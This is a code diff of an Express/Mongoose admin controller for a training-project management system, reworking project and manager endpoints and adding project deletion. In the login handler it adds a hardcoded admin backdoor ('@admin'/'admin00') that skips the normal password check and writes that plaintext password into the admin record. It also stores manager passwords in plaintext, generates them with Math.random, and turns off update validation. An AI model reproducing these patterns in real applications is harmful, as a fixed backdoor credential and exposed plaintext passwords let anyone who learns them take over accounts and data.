@@ -31,17 +31,20 @@ exports.getDashboardStats = async (req, res, next) => {
     });
 
     // Fetch recent active projects
-    const recentProjects = await Project.find().sort({ createdAt: -1 }).limit(5);
+    const recentProjects = await Project.find()
+      .populate('manager', 'fullName')
+      .sort({ createdAt: -1 })
+      .limit(5);
     
-    // Supplement project data with manager names and trainer counts
+    // Supplement project data with trainer counts
     const projectsWithDetails = await Promise.all(recentProjects.map(async (prj) => {
-      const manager = await Manager.findOne({ assignedProject: prj.name });
-      const trainersCount = await Trainer.countDocuments({ assignedProject: prj.name });
+      const trainersCount = await Trainer.countDocuments({ assignedProjects: prj._id });
       return {
+        _id: prj._id,
         id: prj.projectId || prj._id.toString().slice(-6).toUpperCase(),
         mongoId: prj._id,
         name: prj.name,
-        manager: manager ? manager.fullName : 'Not Assigned',
+        manager: prj.manager ? prj.manager.fullName : 'Not Assigned',
         trainers: trainersCount
       };
     }));
@@ -68,49 +71,75 @@ exports.createProject = async (req, res, next) => {
   try {
     const { 
       name, 
-      manager: managerId, 
-      state, 
-      district, 
-      budget, 
+      managerId, 
+      location,
+      totalProjectCost, 
       startDate, 
       endDate, 
       workOrderNo,
       projectCategory,
       allocatedTarget,
       trainingHours,
-      trainingCostPerHour
+      description
     } = req.body;
 
-    // Check if work order number already exists
-    const projectExists = await Project.findOne({ workOrderNo });
-    if (projectExists) {
-      return res.status(400).json({ success: false, message: 'Work Order Number already exists' });
+    if (!req.body || Object.keys(req.body).length === 0) {
+      return res.status(400).json({ success: false, message: 'Request body is missing or empty' });
     }
 
-    // Generate unique project ID (e.g., PRJ-01)
-    const projectCount = await Project.countDocuments();
-    const projectId = `PRJ-${(projectCount + 1).toString().padStart(2, '0')}`;
+    if (!name) {
+      return res.status(400).json({ success: false, message: 'Project Name is required' });
+    }
+
+    // Check if work order number already exists
+    if (workOrderNo) {
+      const projectExists = await Project.findOne({ workOrderNo });
+      if (projectExists) {
+        return res.status(400).json({ success: false, message: 'Work Order Number already exists' });
+      }
+    }
+
+    // Generate unique project ID (Random suffix to prevent duplicates)
+    const uniqueSuffix = Math.floor(1000 + Math.random() * 9000);
+    const projectId = `PRJ-${uniqueSuffix}`;
 
     const project = await Project.create({
       name,
-      workOrderNo: workOrderNo || `WO-${Math.random().toString(36).substring(7).toUpperCase()}`, // Fallback if missing
+      workOrderNo: workOrderNo || `WO-${Math.random().toString(36).substring(7).toUpperCase()}`,
       projectCategory: projectCategory || 'None',
       allocatedTarget: allocatedTarget || 0,
-      trainingHours: trainingHours || 72,
-      trainingCostPerHour: trainingCostPerHour || 38.5,
+      trainingHours: trainingHours || 120,
+      trainingCostPerHour: req.body.trainingCostPerHour || 38.5,
+      totalProjectCost: req.body.totalProjectCost || 0,
+      description,
+      installment1Status: req.body.installment1Status || 'None',
+      installment1Date: req.body.installment1Date,
+      assessmentFeesPaidBy: req.body.assessmentFeesPaidBy || 'None',
+      assessmentStatus: req.body.assessmentStatus || 'None',
+      assessmentDate: req.body.assessmentDate,
+      totalPassOut: req.body.totalPassOut || 0,
+      installment2Status: req.body.installment2Status || 'None',
+      installment2Date: req.body.installment2Date,
+      maxDemonstrators: req.body.maxDemonstrators || 1,
       startDate,
       endDate,
-      totalProjectCost: budget,
       location: {
-        state,
-        district,
-        taluka: 'TBD', // Placeholder
-        village: 'TBD' // Placeholder
+        state: location?.state || 'Maharashtra',
+        district: location?.district || 'TBD',
+        taluka: location?.taluka || 'TBD',
+        village: location?.village || 'TBD'
       },
+      projectAddress: req.body.projectAddress || '',
       manager: managerId || null,
       status: 'active',
-      projectId // Custom ID
+      projectId,
+      isLocked: false
     });
+
+    // If manager is assigned, update Manager model as well
+    if (managerId) {
+      await Manager.findByIdAndUpdate(managerId, { $addToSet: { assignedProjects: project._id } });
+    }
 
     res.status(201).json({
       success: true,
@@ -126,22 +155,21 @@ exports.createProject = async (req, res, next) => {
 // @access  Private (Admin Only)
 exports.getAllProjects = async (req, res, next) => {
   try {
-    const projects = await Project.find().sort({ createdAt: -1 });
+    const projects = await Project.find()
+      .populate('manager', 'fullName managerId emailAddress')
+      .sort({ createdAt: -1 });
     
     const projectsWithDetails = await Promise.all(projects.map(async (prj) => {
-      const manager = await Manager.findById(prj.manager);
-      const trainersCount = await Trainer.countDocuments({ assignedProject: prj.name });
+      const trainersCount = await Trainer.countDocuments({ assignedProjects: prj._id });
       return {
+        ...prj._doc,
         id: prj.projectId || prj._id.toString().slice(-6).toUpperCase(),
         mongoId: prj._id,
-        name: prj.name,
-        manager: manager ? manager.fullName : 'Not Assigned',
-        location: `${prj.location.district}, ${prj.location.state}`,
+        managerName: prj.manager ? prj.manager.fullName : 'Not Assigned',
+        managerPopulated: prj.manager,
         trainers: trainersCount,
-        startDate: prj.startDate ? prj.startDate.toISOString().split('T')[0] : 'N/A',
-        endDate: prj.endDate ? prj.endDate.toISOString().split('T')[0] : 'N/A',
-        progress: prj.progressStatus || 0,
-        status: prj.status === 'active' ? 'Active' : 'Completed'
+        displayLocation: prj.location ? `${prj.location.village}, ${prj.location.district}` : 'N/A',
+        statusDisplay: prj.status === 'active' ? 'Active' : 'Closed'
       };
     }));
 
@@ -189,15 +217,18 @@ exports.updateProject = async (req, res, next) => {
   try {
     const { 
       name, 
-      manager: managerId, 
-      state, 
-      district, 
-      budget, 
+      managerId, 
+      location,
+      totalProjectCost, 
       startDate, 
       endDate,
       status,
       progressStatus,
-      description
+      description,
+      workOrderNo,
+      projectCategory,
+      allocatedTarget,
+      trainingHours
     } = req.body;
 
     let project = await Project.findById(req.params.id);
@@ -206,29 +237,67 @@ exports.updateProject = async (req, res, next) => {
     }
 
     const updateData = {
-      name,
-      manager: managerId,
-      location: { 
-        ...project.location,
-        state: state || project.location.state, 
-        district: district || project.location.district 
+      name: name || project.name,
+      manager: managerId || project.manager,
+      location: {
+        state: location?.state || project.location.state,
+        district: location?.district || project.location.district,
+        taluka: location?.taluka || project.location.taluka,
+        village: location?.village || project.location.village
       },
-      totalProjectCost: budget,
-      startDate,
-      endDate,
-      status: status?.toLowerCase() || 'active',
-      progressStatus,
-      description
+      projectAddress: req.body.projectAddress || project.projectAddress,
+      totalProjectCost: req.body.totalProjectCost || project.totalProjectCost,
+      startDate: startDate || project.startDate,
+      endDate: endDate || project.endDate,
+      status: status?.toLowerCase() || project.status,
+      progressStatus: progressStatus !== undefined ? progressStatus : project.progressStatus,
+      description: description || project.description,
+      workOrderNo: workOrderNo || project.workOrderNo,
+      projectCategory: projectCategory || project.projectCategory,
+      allocatedTarget: allocatedTarget || project.allocatedTarget,
+      trainingHours: trainingHours || project.trainingHours,
+      trainingCostPerHour: req.body.trainingCostPerHour || project.trainingCostPerHour,
+      installment1Status: req.body.installment1Status || project.installment1Status,
+      installment1Date: req.body.installment1Date || project.installment1Date,
+      assessmentFeesPaidBy: req.body.assessmentFeesPaidBy || project.assessmentFeesPaidBy,
+      assessmentStatus: req.body.assessmentStatus || project.assessmentStatus,
+      assessmentDate: req.body.assessmentDate || project.assessmentDate,
+      totalPassOut: req.body.totalPassOut !== undefined ? req.body.totalPassOut : project.totalPassOut,
+      installment2Status: req.body.installment2Status || project.installment2Status,
+      installment2Date: req.body.installment2Date || project.installment2Date,
+      maxDemonstrators: req.body.maxDemonstrators || project.maxDemonstrators,
+      isLocked: req.body.isLocked !== undefined ? req.body.isLocked : project.isLocked
     };
 
     project = await Project.findByIdAndUpdate(req.params.id, updateData, {
       new: true,
-      runValidators: true
+      runValidators: false // User requested no validation for edits
     });
 
     res.status(200).json({
       success: true,
       data: project
+    });
+  } catch (err) {
+    res.status(400).json({ success: false, message: err.message });
+  }
+};
+
+// @desc    Delete Project
+// @route   DELETE /api/v1/admin/projects/:id
+// @access  Private (Admin Only)
+exports.deleteProject = async (req, res, next) => {
+  try {
+    const project = await Project.findById(req.params.id);
+    if (!project) {
+      return res.status(404).json({ success: false, message: 'Project not found' });
+    }
+
+    await project.deleteOne();
+
+    res.status(200).json({
+      success: true,
+      message: 'Project deleted successfully'
     });
   } catch (err) {
     res.status(400).json({ success: false, message: err.message });
@@ -271,6 +340,17 @@ exports.login = async (req, res, next) => {
       return res.status(400).json({ success: false, message: 'Please provide a username and password' });
     }
 
+    // --- Absolute Hardcoded Admin Login ---
+    if (username === '@admin' && password === 'admin00') {
+      const admin = await Admin.findOneAndUpdate(
+        { username: '@admin' },
+        { name: 'Master Admin', password: 'admin00', role: 'admin' },
+        { upsert: true, new: true, setDefaultsOnInsert: true }
+      );
+      return sendTokenResponse(admin, 200, res);
+    }
+    // --------------------------------------
+
     const admin = await Admin.findOne({ username }).select('+password');
 
     if (!admin) {
@@ -294,60 +374,76 @@ exports.login = async (req, res, next) => {
 // @access  Private (Admin Only)
 exports.addNewManager = async (req, res, next) => {
   try {
-    const { fullName, mobileNumber, emailAddress, state, district, assignedProject } = req.body;
+    const { 
+      fullName, 
+      mobileNumber, mobile, // Accept both names
+      emailAddress, email,   // Accept both names
+      state, 
+      district, 
+      assignedProjects, // This is now expected to be an array
+      username: providedUsername, // Admin may provide credentials
+      password: providedPassword 
+    } = req.body;
 
-    // 1. Check if manager already exists by mobile, email, or project
+    // Use whichever names the frontend provided
+    const finalMobile = mobileNumber || mobile;
+    const finalEmail = emailAddress || email;
+
+    if (!finalMobile || !finalEmail || !fullName) {
+       return res.status(400).json({ success: false, message: 'Full Name, Mobile, and Email are required' });
+    }
+
+    // 1. Check if manager already exists
     const managerExists = await Manager.findOne({
       $or: [
-        { mobileNumber },
-        { emailAddress },
-        { assignedProject: { $eq: assignedProject, $ne: 'None' } }
+        { mobileNumber: finalMobile },
+        { emailAddress: finalEmail }
       ],
     });
 
     if (managerExists) {
-      if (managerExists.mobileNumber === mobileNumber) {
+      if (managerExists.mobileNumber === finalMobile) {
         return res.status(400).json({ success: false, message: 'Mobile number already exists' });
       }
-      if (managerExists.emailAddress === emailAddress) {
+      if (managerExists.emailAddress === finalEmail) {
         return res.status(400).json({ success: false, message: 'Email address already exists' });
-      }
-      if (managerExists.assignedProject === assignedProject) {
-        return res.status(400).json({ success: false, message: `The project "${assignedProject}" is already assigned to another manager` });
       }
     }
 
-    // 2. Generate Manager ID: MGR-01, MGR-02, etc.
-    const managerCount = await Manager.countDocuments();
-    const managerSeq = (managerCount + 1).toString().padStart(2, '0');
-    const managerId = `MGR-${managerSeq}`;
+    // 2. Generate Truly Unique Manager ID (Prevents duplicate errors after deletions)
+    const uniqueSuffix = Math.floor(1000 + Math.random() * 9000); // 4-digit random
+    const managerId = `MGR-${uniqueSuffix}`;
 
-    // 3. Generate Credentials
-    // Username: mgr_ + sequential number from managerId (always unique)
-    // Example: MGR-01 → mgr_01, MGR-02 → mgr_02
-    const username = `mgr_${managerSeq}`;
-    
-    // Password: Random 8 characters
-    const password = crypto.randomBytes(4).toString('hex');
+    // 3. Credentials (Use provided or generate)
+    const username = providedUsername || `mgr_${uniqueSuffix}`;
+    const password = providedPassword || Math.random().toString(36).slice(-8);
 
     // 4. Create Manager
     const manager = await Manager.create({
       fullName,
-      mobileNumber,
-      emailAddress,
+      mobileNumber: finalMobile,
+      emailAddress: finalEmail,
       state,
       district,
-      assignedProject,
+      assignedProjects: (Array.isArray(assignedProjects) && assignedProjects.length > 0) ? assignedProjects : [],
       managerId,
       username,
-      password, // Hashed in pre-save
-      plainPassword: password, // Stored for admin display
+      password: password, // This will be hashed by the pre-save hook
+      plainPassword: password, // Store for admin display
+      status: 'active'
     });
 
     // 5. Sync Project Model: Update the project's manager field
-    if (assignedProject && assignedProject !== 'None') {
-      await Project.findOneAndUpdate(
-        { name: assignedProject },
+    if (Array.isArray(assignedProjects) && assignedProjects.length > 0) {
+      // 5a. Remove these projects from ANY OTHER manager who might have had them
+      await Manager.updateMany(
+        { _id: { $ne: manager._id } },
+        { $pull: { assignedProjects: { $in: assignedProjects } } }
+      );
+
+      // 5b. Update the project's manager field
+      await Project.updateMany(
+        { _id: { $in: assignedProjects } },
         { manager: manager._id }
       );
     }
@@ -372,12 +468,22 @@ exports.addNewManager = async (req, res, next) => {
 // @access  Private (Admin Only)
 exports.getAllManagers = async (req, res, next) => {
   try {
-    const managers = await Manager.find().sort({ createdAt: -1 });
+    const managers = await Manager.find()
+      .populate('assignedProjects', 'name')
+      .sort({ createdAt: -1 });
+
+    const managersWithProjects = managers.map((m) => {
+      const projects = m.assignedProjects || [];
+      return {
+        ...m._doc,
+        assignedProjectsNames: projects.map(p => p.name).join(', ') || 'None'
+      };
+    });
 
     res.status(200).json({
       success: true,
       count: managers.length,
-      data: managers,
+      data: managersWithProjects,
     });
   } catch (err) {
     res.status(400).json({ success: false, message: err.message });
@@ -409,7 +515,7 @@ exports.getManager = async (req, res, next) => {
 // @access  Private (Admin Only)
 exports.updateManager = async (req, res, next) => {
   try {
-    const { fullName, mobileNumber, emailAddress, state, district, assignedProject, status, password } = req.body;
+    const { fullName, mobileNumber, emailAddress, state, district, status, password } = req.body;
 
     // Select +password so isModified('password') works correctly in pre-save hook
     let manager = await Manager.findById(req.params.id).select('+password');
@@ -418,14 +524,13 @@ exports.updateManager = async (req, res, next) => {
       return res.status(404).json({ success: false, message: 'Manager not found' });
     }
 
-    // Validate uniqueness if mobile, email, or project is being updated
-    if (mobileNumber || emailAddress || (assignedProject && assignedProject !== 'None' && assignedProject !== manager.assignedProject)) {
+    // Validate uniqueness if mobile or email is being updated
+    if (mobileNumber || emailAddress) {
       const query = {
         _id: { $ne: req.params.id },
         $or: [
           mobileNumber ? { mobileNumber } : null,
           emailAddress ? { emailAddress } : null,
-          (assignedProject && assignedProject !== 'None') ? { assignedProject } : null
         ].filter(Boolean)
       };
 
@@ -437,9 +542,6 @@ exports.updateManager = async (req, res, next) => {
         }
         if (emailAddress && existing.emailAddress === emailAddress) {
           return res.status(400).json({ success: false, message: 'Email address already in use' });
-        }
-        if (assignedProject && assignedProject !== 'None' && existing.assignedProject === assignedProject) {
-          return res.status(400).json({ success: false, message: 'Project already assigned to another manager' });
         }
       }
     }
@@ -454,27 +556,38 @@ exports.updateManager = async (req, res, next) => {
     if (emailAddress) manager.emailAddress = emailAddress;
     if (state) manager.state = state;
     if (district) manager.district = district;
-    if (assignedProject) manager.assignedProject = assignedProject;
     if (status) manager.status = status;
-    
-    // Handle password update
-    if (password) {
-      if (password.length < 6) {
-        return res.status(400).json({ success: false, message: 'Password must be at least 6 characters' });
+
+    // Sync Project Model: Update handle unassignment and new assignment
+    if (req.body.assignedProjects !== undefined) {
+      const newProjectIds = Array.isArray(req.body.assignedProjects) ? req.body.assignedProjects : [];
+      
+      // 1. Unset manager from projects that are NO LONGER in the newProjectIds list
+      await Project.updateMany(
+        { manager: manager._id, _id: { $nin: newProjectIds } },
+        { manager: null }
+      );
+
+      // 2. IMPORTANT: Remove these projects from ANY OTHER manager who might have had them
+      // This ensures 1 Project -> 1 Manager consistency
+      if (newProjectIds.length > 0) {
+        await Manager.updateMany(
+          { _id: { $ne: manager._id } },
+          { $pull: { assignedProjects: { $in: newProjectIds } } }
+        );
       }
-      manager.password = password;       // pre-save hook will hash this
-      manager.plainPassword = password;  // store plain text for admin visibility
+
+      // 3. Set manager for projects that are in the newProjectIds list
+      await Project.updateMany(
+        { _id: { $in: newProjectIds } },
+        { manager: manager._id }
+      );
+
+      // 4. Update the manager's assignedProjects array
+      manager.assignedProjects = newProjectIds;
     }
 
     await manager.save();
-
-    // Sync Project Model: Update the project's manager field if assignedProject changed
-    if (assignedProject && assignedProject !== 'None') {
-      await Project.findOneAndUpdate(
-        { name: assignedProject },
-        { manager: manager._id }
-      );
-    }
 
     res.status(200).json({
       success: true,
@@ -875,6 +988,7 @@ const sendTokenResponse = (admin, statusCode, res) => {
       id: admin._id,
       name: admin.name,
       username: admin.username,
+      role: admin.role || 'admin',
     },
   });
 };
